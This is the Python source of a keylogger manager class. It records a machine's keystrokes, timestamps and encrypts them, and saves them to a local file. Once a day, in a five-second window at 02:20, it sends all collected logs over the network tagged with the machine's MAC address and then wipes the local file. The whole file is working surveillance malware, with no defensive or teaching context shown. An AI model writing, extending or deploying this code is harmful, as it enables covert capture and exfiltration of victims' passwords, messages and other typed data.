import sys
sys.path.append('../../utilities/encryptionDecryption')
from encryption import Encryption
import uuid
from logger.keylogger.keylogger_service import KeyloggerService
from logger.writer.FileWriter import FileWriter
from logger.writer.NetWorkWriter import NetWorkWriter
from time import sleep
from datetime import datetime
import logging

logging.basicConfig(filename='../log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')


class KeyLoggerManager:
    """
    Manages the keylogger, encryption, and data writing processes.

    Attributes:
    -----------
    mac_address : str
        The unique MAC address of the machine.
    writer : IWriter
        The writer used to store or send the logs.
    keylogger : KeyloggerService
        The keylogger service instance.
    encoder : Encryption
        The encryption instance for securing log data.
    flag : bool
        Controls the logging loop.
    """

    def __init__(self):
        self.mac_address = hex(uuid.getnode())
        self.writer = FileWriter()
        self.keylogger = KeyloggerService()
        self.encoder = Encryption(open('../../utilities/key.txt', 'r').read())
        self.flag = True

    def start(self):
        """
        Starts the keylogger process.

        Logs the start of keylogging and handles interruption.
        """
        try:
            self.keylogger.start_logging()
            logging.info('Logging started')
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            self.flag = False

    def handle_logging(self):
        """
        Continuously fetches logged keys, encrypts them, and writes them to storage.

        - If "stop" is detected in logs, logging stops.
        - Adds a timestamp to the logs before encryption.
        - Writes the encrypted data to a file or network storage.

        Runs in a loop until `self.flag` is set to False.
        """
        while self.flag:
            logged_keys = "".join(self.keylogger.get_logged_keys())
            if logged_keys:
                logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                try:
                    encrypted_data = self.encoder.encryption(logged_keys)
                    self.write_data(encrypted_data)
                except Exception as e:
                    logging.error(e)
                    return
            else:
                self.write_data('')
            sleep(5)
        self.keylogger.stop_logging()
        self.flag = False
        logging.info('Logging stopped')

    def write_data(self, encrypted_data):
        """
        Writes encrypted log data to a file or sends it over the network.

        At 02:20:00 - 02:20:05, it switches to `NetWorkWriter`, reads stored data,
        and sends all collected logs before clearing the local file.

        Parameters:
        -----------
        encrypted_data : str
            The encrypted log data to be written or sent.
        """
        if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
            self.writer = NetWorkWriter()
            with open('../Data_File.txt', 'r') as file:
                encrypted_data = file.read() + encrypted_data
            with open('../Data_File.txt', 'w') as file:
                pass
        else:
            self.writer = FileWriter()
        self.writer.send_data(encrypted_data, self.mac_address)
        logging.info(f'Data written to {self.writer}')

